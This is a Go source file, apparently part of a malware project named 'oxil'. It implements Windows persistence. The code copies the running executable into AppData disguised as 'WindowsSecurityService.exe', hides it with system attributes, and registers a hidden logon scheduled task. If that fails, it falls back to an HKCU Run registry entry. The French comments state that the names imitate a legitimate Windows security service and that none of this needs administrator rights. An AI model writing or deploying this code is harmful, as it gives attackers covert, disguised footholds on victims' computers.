package taskpersistence

import (
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"syscall"

	"golang.org/x/sys/windows/registry"

	"github.com/benzoXdev/oxil/utils/fileutil"
)

func Run() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	// Chemin cible dans AppData (ne nécessite pas admin)
	targetDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "System")

	// Créer le dossier s'il n'existe pas
	if !fileutil.Exists(targetDir) {
		err = os.MkdirAll(targetDir, 0755)
		if err != nil {
			return err
		}
	}

	// Nom du fichier pour simuler un service Windows légitime
	path := filepath.Join(targetDir, "WindowsSecurityService.exe")

	// Supprimer l'ancienne version si elle existe
	if fileutil.Exists(path) {
		err = os.Remove(path)
		if err != nil {
			return err
		}
	}

	// Copier l'exécutable
	err = fileutil.CopyFile(exe, path)
	if err != nil {
		return err
	}

	// Rendre le fichier caché et système
	exec.Command("attrib", "+h", "+s", path).Run()

	// Créer une tâche planifiée Windows sans droits admin (utilisateur courant)
	// Utiliser schtasks.exe avec /RU pour spécifier l'utilisateur courant
	taskName := "Windows Security Service"
	currentUser, err := user.Current()
	if err != nil {
		currentUser = &user.User{Username: os.Getenv("USERNAME")}
	}

	// Créer la tâche avec l'utilisateur courant (ne nécessite pas admin)
	cmd := exec.Command("schtasks", "/Create",
		"/TN", taskName,
		"/TR", path,
		"/SC", "ONLOGON", // Au démarrage de la session
		"/RU", currentUser.Username, // Utilisateur courant
		"/RL", "LIMITED", // Privilèges limités (pas besoin d'admin)
		"/F", // Force (supprime si existe déjà)
	)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = cmd.Run()

	if err != nil {
		// Si schtasks échoue, essayer avec une méthode alternative (registre HKCU)
		return createRegistryFallback(path)
	}

	return nil
}

func createRegistryFallback(path string) error {
	// Fallback: utiliser le registre HKCU si schtasks échoue
	// Cette méthode ne nécessite pas admin
	key, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	defer key.Close()

	// Ajouter une entrée avec un nom légitime
	err = key.SetStringValue("Windows Security Service", path)
	return err
}
